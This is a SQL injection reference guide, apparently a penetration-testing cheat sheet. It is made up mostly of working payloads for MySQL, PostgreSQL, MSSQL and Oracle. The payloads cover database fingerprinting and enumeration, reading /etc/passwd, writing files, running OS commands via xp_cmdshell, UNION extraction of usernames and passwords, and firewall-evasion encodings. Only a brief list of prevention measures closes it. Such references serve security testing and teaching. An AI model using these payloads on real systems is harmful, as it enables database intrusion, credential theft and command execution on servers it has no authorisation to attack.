# SQL Injection Reference Guide

## Overview

SQL Injection (SQLi) is a code injection technique that exploits security vulnerabilities in an application's software by inserting malicious SQL statements into entry fields for execution.

## Types of SQL Injection

### 1. In-band SQLi (Classic)
- **Error-based**: Extracts information through error messages
- **Union-based**: Uses UNION operator to extract data

### 2. Inferential SQLi (Blind)
- **Boolean-based**: TRUE/FALSE questions to the database
- **Time-based**: Uses delays (SLEEP) to infer information

### 3. Out-of-band SQLi
- Uses different channel (DNS, HTTP) to retrieve data
- Less common but powerful when available

## Common Payloads

### MySQL
```sql
-- Version
SELECT @@version
SELECT version()

-- Current user
SELECT user()
SELECT current_user()

-- Current database
SELECT database()

-- List tables
SELECT table_name FROM information_schema.tables WHERE table_schema=database()

-- List columns
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Read file
SELECT LOAD_FILE('/etc/passwd')

-- Write file
SELECT 'text' INTO OUTFILE '/tmp/file.txt'

-- Time delay
SELECT SLEEP(5)
SELECT BENCHMARK(1000000,MD5('A'))
```

### PostgreSQL
```sql
-- Version
SELECT version()

-- Current user
SELECT current_user

-- Current database
SELECT current_database()

-- List tables
SELECT table_name FROM information_schema.tables

-- List columns
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Time delay
SELECT pg_sleep(5)
```

### MSSQL
```sql
-- Version
SELECT @@version

-- Current user
SELECT SYSTEM_USER
SELECT SUSER_SNAME()

-- Current database
SELECT DB_NAME()

-- List tables
SELECT name FROM master..sysobjects WHERE xtype='U'

-- List columns
SELECT name FROM master..syscolumns WHERE id=(SELECT id FROM master..sysobjects WHERE name='users')

-- Execute command
EXEC xp_cmdshell 'whoami'

-- Time delay
WAITFOR DELAY '0:0:5'
```

### Oracle
```sql
-- Version
SELECT * FROM v$version
SELECT banner FROM v$version

-- Current user
SELECT user FROM dual

-- List tables
SELECT table_name FROM all_tables

-- List columns
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'

-- Time delay
SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5
```

## Detection Techniques

### Error-Based Detection
```
' -> Syntax error
'' -> No error (string context)
1' -> Syntax error
1'' -> No error (numeric context)
```

### Boolean-Based Detection
```
' AND 1=1 --  -> TRUE (normal response)
' AND 1=2 --  -> FALSE (different response)
```

### Time-Based Detection
```
' AND SLEEP(5) --
' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
```

## Exploitation Techniques

### UNION-Based Extraction

1. **Determine column count**:
```sql
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
-- Until error occurs
```

2. **Find injectable column**:
```sql
' UNION SELECT NULL,NULL,NULL --
' UNION SELECT 1,2,3 --
-- Replace NULLs with different data types
```

3. **Extract data**:
```sql
' UNION SELECT username,password,NULL FROM users --
```

### Error-Based Extraction

MySQL:
```sql
' AND extractvalue(0x0a,concat(0x0a,(SELECT database()))) --
' AND updatexml(null,concat(0x7e,(SELECT @@version),0x7e),null) --
```

PostgreSQL:
```sql
' AND 1=CAST((SELECT version()) AS int) --
```

MSSQL:
```sql
' AND 1=@@version --
' AND 1=CAST((SELECT @@version) AS int) --
```

Oracle:
```sql
' AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE rownum=1)) --
```

## WAF Bypass Techniques

### Comment Obfuscation
```sql
'/**/OR/**/'1'='1
'/*!50000OR*/'1'='1
```

### Encoding
```sql
%27%20OR%20%271%27%3D%271
%2527%2520OR%2520%25271%2527%253D%25271
```

### Case Variation
```sql
' Or '1'='1
' OR '1'='1
```

### Alternative Syntax
```sql
'||'1'='1
'&&'1'='1
```

## Tools

- SQLMap: Automated SQL injection tool
- Burp Suite: Web vulnerability scanner with SQLi detection
- sqlninja: MSSQL injection tool
- BBQSQL: Blind SQL injection framework

## Prevention

1. **Parameterized Queries (Prepared Statements)**
2. **Input Validation**
3. **Least Privilege Database Access**
4. **WAF (Web Application Firewall)**
5. **Stored Procedures** (with caution)

## References

- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- PortSwigger SQL Injection: https://portswigger.net/web-security/sql-injection
